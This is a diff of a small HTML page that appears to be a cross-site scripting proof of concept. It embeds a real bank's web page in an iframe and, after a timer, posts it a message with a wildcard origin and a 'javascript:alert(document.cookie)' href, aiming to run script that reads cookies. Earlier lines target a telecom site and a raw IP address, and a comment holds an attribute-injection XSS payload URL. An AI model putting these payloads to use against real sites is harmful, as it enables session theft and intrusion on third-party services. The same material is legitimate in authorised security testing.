@@ -1,9 +1,10 @@
-<!-- <iframe src="https://220.203.28.230:8015/LowCode/Window/OpenWindow?"></iframe> -->
+<iframe src="https://sinfo3.ccb.com/chn/home/index.shtml"></iframe>
 <script>
-// childwin = window.open("https://xcxp.bmcc.com.cn/rights-front/dist/index.html#/login?appendParam=%257B%257D&toPath=");
-	childwin = window.open("http://220.203.28.230:8015/LowCode/Window/OpenWindow?");
+// childwin = window.open("http://jflove.10010.com/projects?projectName=%E7%A7%AF%E5%88%86");
 function sendMessage(){
-	childwin.postMessage('{"Events":[{"MethodName":"confirm","Param":"111"}]}', '*');
+	document.getElementsByTagName("iframe")[0].contentWindow.postMessage({"command":"pageReload","href":"javascript:alert(document.cookie)"},'*');
+	alert('发送成功');
 }
-(function(){setTimeout("sendMessage()", 3000);}());
+(function(){setTimeout("sendMessage()", 5000);}());
 </script>
+<!-- <https://site.com/x?v1/onfocus='alert(222).jpg'&v1/autofocus='1.jpg'&v1/tabindex='1.jpg'> -->
